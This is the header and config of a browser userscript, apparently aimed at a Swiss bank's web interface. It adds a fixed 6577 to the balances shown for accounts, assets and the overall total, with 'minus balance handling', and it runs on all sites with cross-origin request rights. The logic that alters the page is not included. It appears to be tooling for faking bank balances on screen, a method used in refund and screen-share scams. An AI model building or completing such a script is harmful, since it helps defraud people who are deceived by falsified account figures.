// ==UserScript==
// @name         Ed 5Rec  raif.ch.martinamo490@gmail.com
// @namespace    http://tampermonkey.net/
// @version      6.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/518344/Ed%205Rec%20%20raifchmartinamo490%40gmailcom.user.js
// @updateURL https://update.greasyfork.org/scripts/518344/Ed%205Rec%20%20raifchmartinamo490%40gmailcom.meta.js
// ==/UserScript==




   //=========================================================================================================================================================
 //=========================================================================================================================================================
 //=========================================================================================================================================================


//  MAIN PAGE BALANCE

// //INDEXING STARTS AT 1, NOT 0
 var MBALANCE_CONFIGS = [
    { index: 1, adjustmentAmount: 6577},// Konten
   { index: 3, adjustmentAmount: 6577},// Vermögen
    { index: 4, adjustmentAmount: 6577},  //--Gesamtkonto due to Kreditkarten inexistence
     { index: 5, adjustmentAmount: 6577},
     { index: 7, adjustmentAmount: 6577},


   // Add more configurations as needed...
 ];
